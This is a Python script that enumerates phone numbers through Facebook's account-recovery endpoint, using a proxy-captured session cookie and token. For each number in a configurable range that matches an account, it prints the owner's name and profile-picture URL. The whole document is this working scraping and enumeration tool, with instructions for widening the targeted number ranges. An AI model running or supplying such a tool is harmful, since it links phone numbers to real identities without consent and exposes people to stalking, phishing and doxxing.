#!/usr/bin/env python

import requests
import json
import re
import time

# These two values will have to be updated periodically using a proxy such as
# Burp, or ZAP. Go through the account recovery process once and find the
# POST request for https://www.facebook.com/ajax/login/help/identify.php?ctx=recover&dpr=1.
# It will have both of the needed values.
LSD = 'AVpEnkwc'
DATR = '_kbQV7Rvai02CoOrMgf0FqFb;'

# Compiled regular expressions to get the user's name and profile picture from
# the returned data.
re_pic = re.compile(r'pic.php\?cuid=(.*?)&amp')
re_usr = re.compile(r'<div class="fsl fwb fcb">(.*?)</div>')

# Necessary variables DO NOT MODIFY these.
fb = 'https://www.facebook.com/'
pic_url = '{0}profile/pic.php?cuid='.format(fb)
recover_url = '{0}ajax/login/help/identify.php?ctx=recover&dpr=1'.format(fb)
headers = {
    'Cookie': 'datr={0}'.format(DATR)
}
data = 'lsd={0}&email={1}&did_submit=Search&__user=0&__a=1'


# Determine if a number is associated with an account.
def check_number(number):
    resp = sess.post(recover_url, headers=headers, data=data.format(LSD, number))
    content = resp.content

    if content.startswith('for (;;);'):
        content = content[9:]

    try:
        content = json.loads(content)

    except:
        return None

    urls = content.get('onload')
    if urls is None:
        return None
    else:
        return [u[24:].replace('\\', '').replace('"', '') for u in urls]


# Get the user account information from the URL.
def get_user(url):
    resp = sess.get(url)
    name = re_usr.search(resp.content)
    pic = re_pic.search(resp.content)

    if name is not None:
       name = name.group(1)

    if pic is not None:
       pic = '{0}{1}'.format(pic_url, pic.group(1))

    print('{0} - {1}'.format(name, pic))


# Test all phone numbers between 423.310.3100 and 423.310.3200. Modify this as
# needed to test the phone number ranges you want.
sess = None
for i in range(3100, 3200, 1):
    sess = requests.Session()
    sess.get(fb)

    phone = '423310{0:04}'.format(i)
    accounts = check_number(phone)

    if accounts is not None:
        print(phone)
        print('=' * 10)

        for account in accounts:
            get_user('{0}{1}'.format(fb, account))

        print('')

    time.sleep(5)
